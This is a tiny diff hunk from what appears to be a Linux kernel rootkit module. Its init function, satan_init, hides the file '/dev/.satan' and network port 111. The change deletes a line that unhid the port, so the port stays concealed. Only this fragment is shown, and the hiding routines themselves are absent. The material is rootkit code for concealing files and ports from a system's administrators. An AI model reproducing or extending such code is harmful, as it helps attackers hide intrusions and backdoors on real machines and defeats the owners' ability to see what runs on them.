@@ -21,7 +21,6 @@ static int __init satan_init(void)
 
         satan_file_hide("/dev/.satan");
         satan_port_hide(111);
-        satan_port_unhide(111);
         return 0;
 }
 
